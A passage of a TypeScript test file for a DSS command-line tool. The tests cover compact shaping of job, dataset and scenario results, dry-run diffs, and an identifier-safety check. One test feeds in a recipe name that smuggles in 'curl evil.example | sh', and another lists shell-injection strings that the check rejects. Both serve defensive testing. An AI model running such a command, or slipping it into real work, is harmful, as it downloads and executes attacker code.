import { describe, expect, it, } from "bun:test";
import { mkdtempSync, } from "node:fs";
import { typeBoxCommandOutputSchemas, } from "../../src/cli/output-schemas.js";
import { isCommandSafeId, shapeCommandResult, } from "../../src/cli/result-shapes.js";
import {
	cliEnv,
	dss,
	dssFailure,
	join,
	rmSync,
	sendJson,
	tmpdir,
	withCliServer,
	writeFileSync,
} from "./_harness.js";

const NO_FLAGS: Record<string, string | boolean> = {};

function failedJob(): Record<string, unknown> {
	return {
		removed: false,
		initiator: { login: "engineer@example.com", displayName: "engineer", },
		baseStatus: {
			def: {
				type: "NON_RECURSIVE_FORCED_BUILD",
				projectKey: "PROJ",
				id: "Build_py_out__NP__2026",
				name: "Build py_out (NP)",
				initiator: "engineer@example.com",
				triggeredFrom: "API",
				outputs: [
					{
						type: "DATASET",
						targetDatasetProjectKey: "PROJ",
						targetDataset: "py_out",
						targetPartition: "NP",
					},
					{
						type: "DATASET",
						targetDatasetProjectKey: "OTHER",
						targetDataset: "events",
						targetPartition: "2024-01",
					},
					{
						type: "MANAGED_FOLDER",
						targetManagedFolderProjectKey: "PROJ",
						targetManagedFolder: "abcd1234",
						targetPartition: "NP",
					},
				],
			},
			state: "FAILED",
			jobStartTime: 1000,
			jobEndTime: 2000,
			activities: {
				python_py_out_NP: {
					activityId: "python_py_out_NP",
					recipeName: "python_py_out",
					recipeType: "python",
					state: "FAILED",
					totalTime: 132866,
					warnings: { warnings: {}, totalCount: 2, },
					firstFailure: {
						errorType: "<class 'ValueError'>",
						message: "short",
						detailedMessage: "At line 3: boom",
						stackTrace: [],
					},
					sources: [{ type: "DATASET", id: "PROJ.cust_prep", },],
				},
				sync_NP: {
					activityId: "sync_NP",
					recipeName: "sync",
					recipeType: "sync",
					state: "RUNNING",
					totalTime: 5,
					warnings: { warnings: {}, totalCount: 0, },
					message: "Execution container is initializing",
				},
			},
		},
		globalState: { notStarted: 0, failed: 1, done: 0, running: 1, total: 2, },
		error: {
			errorType: "<class 'ValueError'>",
			message: "short",
			detailedMessage: "At line 3: boom",
		},
		logTail: { totalLines: 0, lines: ["x".repeat(500,),], },
		runtimeSummary: { activities: [], },
	};
}

function infoFixture(): Record<string, unknown> {
	return {
		type: "UploadedFiles",
		name: "customers",
		partitioned: false,
		analyses: [],
		dataset: {
			type: "UploadedFiles",
			managed: false,
			name: "customers",
			formatType: "csv",
			tags: [],
			params: { uploadConnection: "filesystem_managed", },
			schema: {
				columns: [
					{ name: "id", type: "bigint", maxLength: -1, meaning: "", comment: "", },
					{ name: "email", type: "string", meaning: "Email", comment: "contact", },
				],
			},
			metrics: { probes: [], },
		},
		dataQualityStatus: { scope: "RULE", numberItems: 0, },
		recipes: [{ name: "prep", type: "shaker", }, { name: "group", type: "grouping", },],
		buildable: false,
		upstreamBuildable: false,
		downstreamBuildable: true,
		versioning: { lastModifiedOn: 99, lastModifiedBy: { login: "me", displayName: "Me", }, },
		timeline: { items: [{ action: "DATASET_EDIT", },], },
	};
}

function datasetFixture(): Record<string, unknown> {
	return {
		type: "Filesystem",
		managed: true,
		featureGroup: false,
		name: "by_country",
		projectKey: "PROJ",
		checklists: { checklists: [], },
		checks: [],
		customMeta: { kv: {}, },
		formatParams: {
			separator: "\t",
			compress: "",
			hiveSeparators: ["\u0002",],
			skipRowsBeforeHeader: 0,
		},
		versionTag: { versionNumber: 1, },
		creationTag: { versionNumber: 0, },
		tags: [],
		params: {
			connection: "fs",
			path: "${projectKey}/by_country",
			filesSelectionRules: { includeRules: [], },
		},
		schema: { columns: [{ name: "c", type: "string", comment: "", },], userModified: true, },
		metrics: { probes: [{ type: "basic", },], },
		metricsChecks: { checks: [], },
	};
}

async function jobGet(args: string[],): Promise<string> {
	let stdout = "";
	await withCliServer((req, res,) => {
		expect(new URL(req.url ?? "/", "http://localhost",).pathname,).toBe(
			"/public/api/projects/TEST/jobs/Build_py_out__NP__2026/",
		);
		sendJson(res, failedJob(),);
	}, async (url,) => {
		const result = await dss(["job", "get", "Build_py_out__NP__2026", ...args,], {
			env: cliEnv(url,),
		},);
		expect(result.stderr,).toBe("",);
		stdout = result.stdout;
	},);
	return stdout;
}

describe("job get compact shape", () => {
	it("maps state, outputs, progress, error and activities and never includes the log tail", () => {
		const shaped = shapeCommandResult("job", "get", failedJob(), NO_FLAGS,) as Record<
			string,
			unknown
		>;
		expect(shaped,).toEqual({
			id: "Build_py_out__NP__2026",
			name: "Build py_out (NP)",
			type: "NON_RECURSIVE_FORCED_BUILD",
			state: "FAILED",
			initiator: "engineer@example.com",
			triggeredFrom: "API",
			startTime: 1000,
			endTime: 2000,
			outputs: [
				{ type: "DATASET", id: "py_out", },
				{ type: "DATASET", id: "events", projectKey: "OTHER", partition: "2024-01", },
				{ type: "MANAGED_FOLDER", id: "abcd1234", },
			],
			progress: { notStarted: 0, failed: 1, done: 0, running: 1, total: 2, },
			error: { type: "<class 'ValueError'>", message: "At line 3: boom", },
			activities: [
				{
					id: "python_py_out_NP",
					recipe: "python_py_out",
					recipeType: "python",
					state: "FAILED",
					totalTime: 132866,
					warnings: 2,
					error: { type: "<class 'ValueError'>", message: "At line 3: boom", },
				},
				{
					id: "sync_NP",
					recipe: "sync",
					recipeType: "sync",
					state: "RUNNING",
					totalTime: 5,
					warnings: 0,
					message: "Execution container is initializing",
				},
			],
		},);
		expect(JSON.stringify(shaped,),).not.toContain("logTail",);
		expect(JSON.stringify(shaped,),).not.toContain("xxxx",);
	});

	it("omits absent optional fields instead of emitting null", () => {
		const shaped = shapeCommandResult("job", "get", {
			baseStatus: { def: { id: "J", outputs: [], }, state: "DONE", activities: {}, },
		}, NO_FLAGS,) as Record<string, unknown>;
		expect(shaped,).toEqual({ id: "J", state: "DONE", outputs: [], activities: [], },);
	});
});

describe("dataset info compact shape", () => {
	it("keeps identity, schema, flow neighbours and freshness only", () => {
		expect(shapeCommandResult("dataset", "info", infoFixture(), NO_FLAGS,),).toEqual({
			name: "customers",
			type: "UploadedFiles",
			managed: false,
			connection: "filesystem_managed",
			formatType: "csv",
			partitioned: false,
			schema: [
				{ name: "id", type: "bigint", },
				{ name: "email", type: "string", meaning: "Email", comment: "contact", },
			],
			recipes: ["prep", "group",],
			buildable: false,
			upstreamBuildable: false,
			downstreamBuildable: true,
			lastModifiedOn: 99,
			lastModifiedBy: "me",
		},);
	});

	it("reports tags, data quality and the last build when DSS has them", () => {
		const raw = infoFixture();
		(raw["dataset"] as Record<string, unknown>)["tags"] = ["prod",];
		(raw["dataset"] as Record<string, unknown>)["params"] = { connection: "pg", };
		raw["dataQualityStatus"] = { scope: "RULE", numberItems: 3, numberWorstOutcome: 1, };
		raw["lastBuild"] = { jobId: "J1", buildSuccess: true, buildEndTime: 5, id: "customers", };
		const shaped = shapeCommandResult("dataset", "info", raw, NO_FLAGS,) as Record<string, unknown>;
		expect(shaped["connection"],).toBe("pg",);
		expect(shaped["tags"],).toEqual(["prod",],);
		expect(shaped["dataQuality"],).toEqual({
			scope: "RULE",
			numberItems: 3,
			numberWorstOutcome: 1,
		},);
		expect(shaped["lastBuild"],).toEqual({ jobId: "J1", success: true, endTime: 5, },);
	});
});

describe("dataset get / project get pruning", () => {
	it("drops empty values and metadata blocks, keeps false and 0, and keeps the settings structure", () => {
		const raw = datasetFixture();
		const before = JSON.stringify(raw,);
		expect(shapeCommandResult("dataset", "get", raw, NO_FLAGS,),).toEqual({
			type: "Filesystem",
			managed: true,
			featureGroup: false,
			name: "by_country",
			projectKey: "PROJ",
			formatParams: { separator: "\t", skipRowsBeforeHeader: 0, },
			params: { connection: "fs", path: "${projectKey}/by_country", },
			schema: { columns: [{ name: "c", type: "string", },], userModified: true, },
		},);
		expect(JSON.stringify(raw,),).toBe(before,);
	});

	it("collapses project permission flags into the denied ones without losing any", () => {
		const raw = {
			projectKey: "PROJ",
			name: "Proj",
			isProjectAdmin: false,
			canReadProjectContent: true,
			canWriteProjectContent: false,
			canExportGitRepository: false,
			canSomethingElse: "kept",
			objectImgHash: 1,
			isProjectImg: false,
			defaultImgColor: "#fff",
			imgPattern: 6,
			metrics: { probes: [], },
			versionTag: { versionNumber: 0, },
			creationTag: { versionNumber: 0, },
			checklists: { checklists: [], },
			contributors: [],
			tutorialProject: false,
		};
		const shaped = shapeCommandResult("project", "get", raw, NO_FLAGS,) as Record<string, unknown>;
		expect(shaped,).toEqual({
			projectKey: "PROJ",
			name: "Proj",
			canSomethingElse: "kept",
			tutorialProject: false,
			deniedPermissions: ["isProjectAdmin", "canWriteProjectContent", "canExportGitRepository",],
		},);
	});

	it("always reports deniedPermissions, empty when everything is granted", () => {
		const shaped = shapeCommandResult("project", "get", {
			projectKey: "P",
			name: "P",
			canReadProjectContent: true,
		}, NO_FLAGS,);
		expect(shaped,).toEqual({ projectKey: "P", name: "P", deniedPermissions: [], },);
	});
});

describe("bypassing the compact default", () => {
	it("returns the DSS object for --full and for --fields", () => {
		const raw = failedJob();
		expect(shapeCommandResult("job", "get", raw, { full: true, },),).toBe(raw,);
		expect(shapeCommandResult("job", "get", raw, { fields: "state", },),).toBe(raw,);
	});

	it("leaves other actions and non-object results unchanged and still shapes lists", () => {
		const raw = { baseStatus: {}, };
		expect(shapeCommandResult("job", "summary", raw, NO_FLAGS,),).toBe(raw,);
		expect(shapeCommandResult("job", "get", "text", NO_FLAGS,),).toBe("text",);
		expect(
			shapeCommandResult("dataset", "list", [{
				name: "a",
				type: "S3",
				managed: true,
				params: { connection: "c", },
			},], NO_FLAGS,),
		).toEqual([{ name: "a", type: "S3", managed: true, connection: "c", },],);
	});
});

describe("CLI job get output", () => {
	it("is compact by default, raw with --full, and a raw projection with --fields", async () => {
		const compact = JSON.parse(await jobGet([],),) as Record<string, unknown>;
		expect(compact["state"],).toBe("FAILED",);
		expect("logTail" in compact,).toBe(false,);
		expect(JSON.parse(await jobGet(["--full",],),),).toEqual(failedJob(),);
		expect(JSON.parse(await jobGet(["--fields", "baseStatus.state",],),),).toEqual({
			"baseStatus.state": "FAILED",
		},);
	});
});

describe("discovery output schemas of the compact reads", () => {
	const schemas = typeBoxCommandOutputSchemas();

	it("describes the compact job.get and dataset.info defaults", () => {
		const job = schemas["job.get"] as { properties: Record<string, unknown>; };
		expect(Object.keys(job.properties,),).toEqual([
			"id",
			"name",
			"type",
			"state",
			"initiator",
			"triggeredFrom",
			"startTime",
			"endTime",
			"outputs",
			"progress",
			"error",
			"activities",
		],);
		const info = schemas["dataset.info"] as { properties: Record<string, unknown>; };
		expect("schema" in info.properties,).toBe(true,);
		expect("lastBuild" in info.properties,).toBe(true,);
	});

	it("describes dataset.get and project.get without the dropped metadata", () => {
		const project = schemas["project.get"] as {
			properties: Record<string, unknown>;
			required: string[];
		};
		expect("versionTag" in project.properties,).toBe(false,);
		expect("creationTag" in project.properties,).toBe(false,);
		expect("deniedPermissions" in project.properties,).toBe(true,);
		expect(project.required,).toEqual(["projectKey", "name", "deniedPermissions",],);
		const dataset = schemas["dataset.get"] as { properties: Record<string, unknown>; };
		expect("name" in dataset.properties,).toBe(true,);
		expect("schema" in dataset.properties,).toBe(true,);
	});
});

const RUN_ID = "2026-01-02-03-04-05-678";
const FAILED_JOB_ID = "Scenario_build_report__NP__2026-01-02T03-04-05.700";
const KEY_ERROR =
	"Error in python process: At line 5: <class 'KeyError'>: Column not found: amount_euro";

function builtDatasetItem(datasetName: string, outcome: string,): Record<string, unknown> {
	return {
		type: "BUILT_DATASET",
		target: { type: "DATASET_PARTITION", projectKey: "TEST", datasetName, partition: "NP", },
		start: 1_700_000_001_000,
		end: 1_700_000_002_000,
		outcome,
		warnings: { warnings: {}, totalCount: 0, },
	};
}

/**
 * Mirrors the raw GET /scenarios/{id}/{runId}/ report of a build_flowitem step
 * (fake ids). `jobs: false` drops the report items, as a failure before any job.
 */
function scenarioRunReport(
	{ outcome = "FAILED", jobs = true, }: { outcome?: string; jobs?: boolean; } = {},
): Record<string, unknown> {
	const permissions = { admin: true, mayCreateProjects: true, mayWriteUnsafeCode: true, };
	const reportItems = jobs
		? [
			builtDatasetItem("prep", "SUCCESS",),
			builtDatasetItem("report", outcome,),
			{
				type: "JOB_EXECUTED",
				jobId: FAILED_JOB_ID,
				target: { type: "JOBS", },
				outcome,
				thrown: { message: KEY_ERROR, },
				logTail: { lines: ["[INFO] a very long job log line",], status: [1,], maxLevel: 3, },
			},
		]
		: [];
	return {
		scenarioRun: {
			start: 1_700_000_000_000,
			end: 1_700_000_036_000,
			trigger: {
				projectKey: "TEST",
				scenarioId: "nightly",
				trigger: { id: "manual", type: "manual", name: "API run", delay: 0, },
				triggerAuthCtx: {
					userGroupLevelPermissions: permissions,
					authSource: "PERSONAL_API_KEY",
					apiKey: { id: "FAKEKEYID", label: "Personal for tester", createdBy: "tester", },
				},
			},
			result: {
				type: "SCENARIO_DONE",
				target: { type: "SCENARIO", projectKey: "TEST", scenarioId: "nightly", },
				outcome,
			},
			runAsUser: { userGroupLevelPermissions: permissions, userProfile: "FULL_DESIGNER", },
			scenario: { projectKey: "TEST", id: "nightly", type: "step_based", params: { steps: [], }, },
			runId: RUN_ID,
		},
		stepRuns: [{
			scenarioRun: { runId: RUN_ID, },
			additionalReportItems: reportItems,
			step: { id: "build", type: "build_flowitem", name: "Build report", params: { builds: [], }, },
			runId: "2026-01-02-03-04-05-679",
			result: { type: "STEP_DONE", outcome, },
		},],
	};
}

/** Raw get-last-runs items: the run's scenario snapshot and result, newest first. */
function lastRunsFixture(thrownMessage?: string,): Array<Record<string, unknown>> {
	return [
		{
			runId: RUN_ID,
			start: 1_700_000_000_000,
			end: 1_700_000_036_000,
			trigger: { trigger: { type: "manual", name: "API run", }, },
			scenario: { projectKey: "TEST", id: "nightly", },
			result: {
				type: "SCENARIO_DONE",
				outcome: "FAILED",
				...(thrownMessage === undefined ? {} : { thrown: { message: thrownMessage, }, }),
			},
		},
		{
			runId: "2026-01-01-03-04-05-000",
			start: 1_699_900_000_000,
			end: 1_699_900_010_000,
			scenario: { projectKey: "TEST", id: "nightly", },
			result: { type: "SCENARIO_DONE", outcome: "SUCCESS", },
		},
	];
}

describe("scenario get-run compact shape", () => {
	it("surfaces the failure, per-step datasets and jobs, and next-step argv", () => {
		const compact = shapeCommandResult("scenario", "get-run", scenarioRunReport(), NO_FLAGS,);
		expect(compact,).toEqual({
			runId: RUN_ID,
			scenarioId: "nightly",
			projectKey: "TEST",
			outcome: "FAILED",
			start: 1_700_000_000_000,
			end: 1_700_000_036_000,
			durationMs: 36_000,
			trigger: { type: "manual", name: "API run", },
			steps: [{
				id: "build",
				name: "Build report",
				type: "build_flowitem",
				outcome: "FAILED",
				datasets: [
					{ dataset: "prep", outcome: "SUCCESS", },
					{ dataset: "report", outcome: "FAILED", },
				],
				jobs: [{ jobId: FAILED_JOB_ID, outcome: "FAILED", message: KEY_ERROR, },],
			},],
			failure: { stepId: "build", jobId: FAILED_JOB_ID, dataset: "report", message: KEY_ERROR, },
			next: [["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],],
		},);
		const text = JSON.stringify(compact,);
		for (
			const noise of [
				"apiKey",
				"userGroupLevelPermissions",
				"mayCreateProjects",
				"logTail",
				"runAsUser",
			]
		) {
			expect(text.includes(noise,), `compact output must not contain ${noise}`,).toBe(false,);
		}
		expect(text.length,).toBeLessThan(1_500,);
	});

	it("omits failure and next for a successful run", () => {
		const compact = shapeCommandResult(
			"scenario",
			"get-run",
			scenarioRunReport({ outcome: "SUCCESS", },),
			NO_FLAGS,
		);
		expect(compact,).not.toHaveProperty("failure",);
		expect(compact,).not.toHaveProperty("next",);
	});

	it("points at the scenario run log when no job ran", () => {
		const compact = shapeCommandResult(
			"scenario",
			"get-run",
			scenarioRunReport({ jobs: false, },),
			NO_FLAGS,
		);
		expect(compact,).toMatchObject({
			failure: { stepId: "build", },
			next: [[
				"dss",
				"scenario",
				"log",
				"nightly",
				RUN_ID,
				"--step-id",
				"build",
				"--project-key",
				"TEST",
			],],
		},);
	});

	it("returns the DSS report for --full and --fields", () => {
		const raw = scenarioRunReport();
		expect(shapeCommandResult("scenario", "get-run", raw, { full: true, },),).toBe(raw,);
		expect(shapeCommandResult("scenario", "get-run", raw, { fields: "stepRuns", },),).toBe(raw,);
	});
});

describe("isCommandSafeId", () => {
	it("accepts DSS identifiers and rejects anything a shell or flag parser would act on", () => {
		for (const safe of ["python_report", "TEST", "OTHER.rates", "nightly", RUN_ID, FAILED_JOB_ID,]) {
			expect(isCommandSafeId(safe,), safe,).toBe(true,);
		}
		for (
			const unsafe of [
				"",
				"a b",
				"a;b",
				"a$(b)",
				"a`b`",
				"a'b",
				'a"b',
				"a|b",
				"a\nb",
				"-rf",
				"a&b",
				"a>b",
				"a\\b",
				"a*",
			]
		) {
			expect(isCommandSafeId(unsafe,), JSON.stringify(unsafe,),).toBe(false,);
		}
		expect(isCommandSafeId(undefined,),).toBe(false,);
		expect(isCommandSafeId(42,),).toBe(false,);
	});
});

describe("scenario last-runs compact shape", () => {
	it("keeps one small object per run and points a failed run at get-run", () => {
		expect(shapeCommandResult("scenario", "last-runs", lastRunsFixture(), NO_FLAGS,),).toEqual([
			{
				runId: RUN_ID,
				outcome: "FAILED",
				start: 1_700_000_000_000,
				end: 1_700_000_036_000,
				trigger: { type: "manual", name: "API run", },
				next: [["dss", "scenario", "get-run", "nightly", RUN_ID, "--project-key", "TEST",],],
			},
			{
				runId: "2026-01-01-03-04-05-000",
				outcome: "SUCCESS",
				start: 1_699_900_000_000,
				end: 1_699_900_010_000,
			},
		],);
	});

	it("carries the failure message when DSS reports one and passes --full through", () => {
		const runs = lastRunsFixture("boom",);
		expect(shapeCommandResult("scenario", "last-runs", runs, NO_FLAGS,),).toMatchObject([
			{ failure: { message: "boom", }, },
			{},
		],);
		expect(shapeCommandResult("scenario", "last-runs", runs, { full: true, },),).toBe(runs,);
	});
});

/** Run `dss scenario ARGS` against a server holding `body` at `path` and `extra` by path; anything else is a 404. */
async function scenarioCli(
	args: string[],
	body: unknown,
	path: string,
	extra: Record<string, unknown> = {},
): Promise<unknown> {
	let stdout = "";
	await withCliServer((req, res,) => {
		const requested = new URL(req.url ?? "/", "http://localhost",).pathname;
		if (requested in extra) {
			sendJson(res, extra[requested],);
		} else if (requested === path) {
			sendJson(res, body,);
		} else {
			sendJson(res, { message: `Not found: ${requested}`, }, 404,);
		}
	}, async (url,) => {
		const result = await dss(["scenario", ...args,], { env: cliEnv(url,), },);
		expect(result.stderr,).toBe("",);
		stdout = result.stdout;
	},);
	return JSON.parse(stdout,);
}

/** Raw `job get` of the failed scenario job: one FAILED python activity. */
const failedScenarioJob = {
	baseStatus: {
		state: "FAILED",
		activities: {
			python_report_NP: {
				recipeName: "python_report",
				state: "FAILED",
				sources: [
					{ type: "DATASET", id: "TEST.orders_joined", },
					{ type: "DATASET", id: "OTHER.rates", },
				],
			},
		},
	},
};

/** Raw GET of the failed recipe and of one input's schema, as the diagnosis reads them. */
const failedRecipeGet = (payload: string,) => ({
	recipe: { type: "python", name: "python_report", },
	payload,
});
const inputSchemaGet = (count: number,) => ({
	columns: Array.from(
		{ length: count, },
		(_, index,) => ({ name: `c${index}`, type: "double", comment: "", }),
	),
	userModified: false,
});

describe("CLI scenario get-run / last-runs output", () => {
	const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
	const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
	const recipePath = "/public/api/projects/TEST/recipes/python_report";
	const schemaPath = "/public/api/projects/TEST/datasets/orders_joined/schema";
	const CODE = 'out = df.groupby("country")["amount_euro"].sum()\n';
	const args = ["get-run", "nightly", RUN_ID,];
	const fixHint =
		"To fix: dss recipe set-payload python_report --old TEXT --new TEXT --project-key TEST; rerun: dss scenario run-and-wait nightly --project-key TEST.";

	it("get-run carries the failed recipe's code and input columns, and is raw with --full", async () => {
		const compact = await scenarioCli(args, scenarioRunReport(), path, {
			[jobPath]: failedScenarioJob,
			[recipePath]: failedRecipeGet(CODE,),
			[schemaPath]: inputSchemaGet(2,),
		},) as { failure: Record<string, unknown>; };
		expect(compact.failure,).toEqual({
			stepId: "build",
			jobId: FAILED_JOB_ID,
			dataset: "report",
			message: KEY_ERROR,
			recipe: "python_report",
			inputs: ["orders_joined", "OTHER.rates",],
			payload: CODE,
			inputSchemas: {
				orders_joined: [{ name: "c0", type: "double", }, { name: "c1", type: "double", },],
			},
		},);
		// What was read is no longer a command; the input that could not be read still is.
		expect(compact,).toMatchObject({
			next: [
				["dss", "dataset", "schema", "OTHER.rates", "--project-key", "TEST",],
				["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],
			],
			hint: fixHint,
		},);
		expect(await scenarioCli([...args, "--full",], scenarioRunReport(), path,),).toEqual(
			scenarioRunReport(),
		);
	});

	it("get-run leaves a large payload, a wide schema and unreadable inputs as commands in next", async () => {
		const compact = await scenarioCli(args, scenarioRunReport(), path, {
			[jobPath]: failedScenarioJob,
			[recipePath]: failedRecipeGet("x".repeat(12_001,),),
			[schemaPath]: inputSchemaGet(101,),
		},) as { failure: Record<string, unknown>; };
		expect(compact.failure,).not.toHaveProperty("payload",);
		expect(compact.failure,).not.toHaveProperty("inputSchemas",);
		expect(compact,).toMatchObject({
			next: [
				["dss", "recipe", "cat", "python_report", "--project-key", "TEST",],
				["dss", "dataset", "schema", "orders_joined", "--project-key", "TEST",],
				["dss", "dataset", "schema", "OTHER.rates", "--project-key", "TEST",],
				["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],
			],
			hint: fixHint,
		},);
	});

	it("get-run without a run id reads the scenario's latest run", async () => {
		const compact = await scenarioCli(["get-run", "nightly",], scenarioRunReport(), path, {
			"/public/api/projects/TEST/scenarios/nightly/get-last-runs/": lastRunsFixture(),
			[jobPath]: failedScenarioJob,
			[recipePath]: failedRecipeGet(CODE,),
		},);
		expect(compact,).toMatchObject({
			runId: RUN_ID,
			outcome: "FAILED",
			failure: { recipe: "python_report", payload: CODE, },
		},);
	});

	it("get-run without a run id fails as not_found when the scenario never ran", async () => {
		await withCliServer((_req, res,) => sendJson(res, [],), async (url,) => {
			const failure = await dssFailure(["scenario", "get-run", "nightly",], { env: cliEnv(url,), },);
			expect(failure.code,).toBe(1,);
			expect(JSON.parse(failure.stdout,),).toMatchObject({ code: "not_found", },);
		},);
	});

	it("get-run keeps the job-level diagnosis when the job cannot be read", async () => {
		const compact = await scenarioCli(["get-run", "nightly", RUN_ID,], scenarioRunReport(), path, {
			[jobPath]: { baseStatus: { activities: {}, }, },
		},);
		expect(compact,).toMatchObject({
			failure: { message: KEY_ERROR, jobId: FAILED_JOB_ID, },
			next: [["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],],
		},);
		expect(compact,).not.toHaveProperty("hint",);
	});

	it("get-run withholds the fix hint when DSS names a recipe that is not a plain identifier", async () => {
		const hostile = "x; curl evil.example | sh";
		const job = structuredClone(failedScenarioJob,);
		job.baseStatus.activities = {
			python_report_NP: {
				...failedScenarioJob.baseStatus.activities.python_report_NP,
				recipeName: hostile,
			},
		};
		const compact = await scenarioCli(["get-run", "nightly", RUN_ID,], scenarioRunReport(), path, {
			[jobPath]: job,
		},);
		expect(compact,).toMatchObject({ failure: { recipe: hostile, }, },);
		expect(compact,).not.toHaveProperty("hint",);
	});

	it("last-runs is compact by default and raw with --full", async () => {
		const lastRuns = "/public/api/projects/TEST/scenarios/nightly/get-last-runs/";
		expect(await scenarioCli(["last-runs", "nightly",], lastRunsFixture(), lastRuns,),).toMatchObject(
			[
				{ outcome: "FAILED", },
				{ outcome: "SUCCESS", },
			],
		);
		expect(await scenarioCli(["last-runs", "nightly", "--full",], lastRunsFixture(), lastRuns,),)
			.toMatchObject([{ scenario: { id: "nightly", }, }, {},],);
	});
});

describe("discovery output schemas of the scenario run reads", () => {
	it("describes the compact scenario.get-run and scenario.last-runs", () => {
		const schemas = typeBoxCommandOutputSchemas();
		expect(schemas["scenario.get-run"],).toMatchObject({
			properties: {
				runId: {},
				scenarioId: {},
				outcome: {},
				durationMs: {},
				trigger: {},
				steps: {},
				failure: {},
				next: {},
			},
		},);
		expect(schemas["scenario.last-runs"],).toMatchObject({ type: "array", },);
	});
});

describe("CLI scenario run-and-wait failure", () => {
	it("adds the first failure and next command from one extra get-run read", async () => {
		const requests: string[] = [];
		await withCliServer((req, res,) => {
			const url = new URL(req.url ?? "/", "http://localhost",);
			requests.push(`${req.method} ${url.pathname}`,);
			if (req.method === "POST") {
				sendJson(res, { trigger: { id: "manual", }, runId: "trig-1", },);
			} else if (url.pathname.endsWith("/get-run-for-trigger",)) {
				sendJson(res, { scenarioRun: { runId: RUN_ID, result: { outcome: "FAILED", }, }, },);
			} else {
				sendJson(res, scenarioRunReport(),);
			}
		}, async (url,) => {
			const failure = await dssFailure([
				"scenario",
				"run-and-wait",
				"nightly",
				"--poll-interval",
				"1",
			], {
				env: cliEnv(url,),
			},);
			expect(failure.code,).toBe(4,);
			expect(JSON.parse(failure.stdout,),).toMatchObject({
				error: KEY_ERROR,
				code: "long_running_failure",
				details: {
					result: {
						outcome: "FAILED",
						failure: { stepId: "build", jobId: FAILED_JOB_ID, dataset: "report", message: KEY_ERROR, },
						next: [["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],],
					},
				},
			},);
		},);
		expect(
			requests.filter((request,) => request.startsWith("GET",) && request.endsWith(`/${RUN_ID}/`,),),
		)
			.toHaveLength(2,);
	});
});

const dryRun = (current: unknown, next: unknown,): Record<string, unknown> => ({
	dryRun: true,
	action: "update",
	resource: "dataset",
	name: "orders",
	current,
	next,
});
const describeChange = (result: unknown,): Record<string, unknown> =>
	shapeCommandResult("dataset", "update", result, NO_FLAGS,) as Record<string, unknown>;

describe("dry-run change description", () => {
	it("replaces current and next with the leaf differences, keeping the other members in place", () => {
		const result = { ...dryRun({ a: 1, }, { a: 2, },), hash: "h", };
		const before = JSON.stringify(result,);
		const shaped = describeChange(result,);
		expect(Object.keys(shaped,),).toEqual([
			"dryRun",
			"action",
			"resource",
			"name",
			"changes",
			"changeCount",
			"hash",
		],);
		expect(shaped,).toMatchObject({
			changes: [{ path: "a", before: 1, after: 2, },],
			changeCount: 1,
		},);
		expect(JSON.stringify(result,),).toBe(before,);
	});

	it("recurses into nested objects and reports added and removed keys with the absent side omitted", () => {
		const shaped = describeChange(dryRun(
			{ params: { path: "/a", keep: true, }, gone: "x", },
			{ params: { path: "/b", keep: true, }, fresh: [1,], },
		),);
		expect(shaped["changes"],).toEqual([
			{ path: "params.path", before: "/a", after: "/b", },
			{ path: "gone", before: "x", },
			{ path: "fresh", after: [1,], },
		],);
		expect(shaped["changeCount"],).toBe(3,);
		expect(shaped,).not.toHaveProperty("changesTruncated",);
	});

	it("recurses into equal-length arrays by index and reports different-length arrays as one change", () => {
		const shaped = describeChange(dryRun(
			{ steps: [{ name: "x", }, { name: "y", },], tags: ["a",], },
			{ steps: [{ name: "x", }, { name: "z", },], tags: ["a", "b",], },
		),);
		expect(shaped["changes"],).toEqual([
			{ path: "steps.1.name", before: "y", after: "z", },
			{ path: "tags", before: ["a",], after: ["a", "b",], },
		],);
	});

	it("reports a pair of different types as one change at that path", () => {
		const shaped = describeChange(dryRun(
			{ a: 1, b: { x: 1, }, c: null, },
			{ a: "1", b: [1,], c: {}, },
		),);
		expect(shaped["changes"],).toEqual([
			{ path: "a", before: 1, after: "1", },
			{ path: "b", before: { x: 1, }, after: [1,], },
			{ path: "c", before: null, after: {}, },
		],);
	});

	it("reports a no-op edit as no changes", () => {
		const shaped = describeChange(dryRun({ a: { b: [1, 2,], }, }, { a: { b: [1, 2,], }, },),);
		expect(shaped,).toMatchObject({ changes: [], changeCount: 0, },);
		expect(shaped,).not.toHaveProperty("current",);
		expect(shaped,).not.toHaveProperty("next",);
	});

	it("caps the listed changes at 50 and counts all of them", () => {
		const current: Record<string, number> = {};
		const next: Record<string, number> = {};
		for (let index = 0; index < 60; index++) {
			current[`k${index}`] = 0;
			next[`k${index}`] = 1;
		}
		const shaped = describeChange(dryRun(current, next,),);
		const changes = shaped["changes"] as Array<{ path: string; }>;
		expect(changes,).toHaveLength(50,);
		expect(changes[0].path,).toBe("k0",);
		expect(changes[49].path,).toBe("k49",);
		expect(shaped["changeCount"],).toBe(60,);
		expect(shaped["changesTruncated"],).toBe(true,);
	});

	it("describes a long multi-line string change with a unified diff instead of the values", () => {
		const lines = Array.from({ length: 40, }, (_, index,) => `line ${index}`,);
		const edited = lines.map((line, index,) => index === 20 ? "line 20 changed" : line,);
		const current = lines.join("\n",);
		const next = edited.join("\n",);
		const shaped = describeChange(dryRun({ payload: current, }, { payload: next, },),);
		const [change,] = shaped["changes"] as Array<Record<string, unknown>>;
		expect(change,).not.toHaveProperty("before",);
		expect(change,).not.toHaveProperty("after",);
		expect(change,).toMatchObject({
			path: "payload",
			beforeBytes: Buffer.byteLength(current,),
			afterBytes: Buffer.byteLength(next,),
		},);
		const diff = (change["diff"] as string).split("\n",);
		expect(diff.slice(0, 3,),).toEqual(["--- a/payload", "+++ b/payload", "@@ -18,7 +18,7 @@",],);
		expect(diff,).toContain("-line 20",);
		expect(diff,).toContain("+line 20 changed",);
		expect(diff,).not.toContain(" line 10",);
		expect(shaped["changeCount"],).toBe(1,);
	});

	it("truncates a long diff at 60 lines with the truncation marker", () => {
		const current = Array.from({ length: 200, }, (_, index,) => `old ${index}`,).join("\n",);
		const next = Array.from({ length: 200, }, (_, index,) => `new ${index}`,).join("\n",);
		const [change,] = describeChange(
			dryRun({ payload: current, }, { payload: next, },),
		)["changes"] as Array<
			Record<string, unknown>
		>;
		const diff = change["diff"] as string;
